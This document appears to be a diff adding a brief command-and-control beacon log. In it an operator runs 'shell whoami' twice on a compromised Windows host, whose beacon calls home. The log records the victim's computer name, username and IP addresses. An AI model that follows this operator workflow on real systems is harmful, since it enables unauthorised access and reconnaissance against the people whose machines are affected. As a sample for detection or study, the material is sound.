@@ -1,0 +1,11 @@
+12/10 18:37:17 UTC [metadata] 49.228.59.8 <- 192.168.1.122; computer: AYUN; user: 阿云; process: wpscan.exe; pid: 24604; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/10 18:38:05 UTC [input] <jhc> shell whoami
+12/10 18:38:05 UTC [task] <T1059> Tasked beacon to run: whoami
+12/10 18:38:05 UTC [checkin] host called home, sent: 37 bytes
+12/10 18:38:06 UTC [output]
+received output:
+ayun\阿云
+
+
+12/10 18:40:36 UTC [input] <jhc> shell whoami
+12/10 18:40:36 UTC [task] <T1059> Tasked beacon to run: whoami
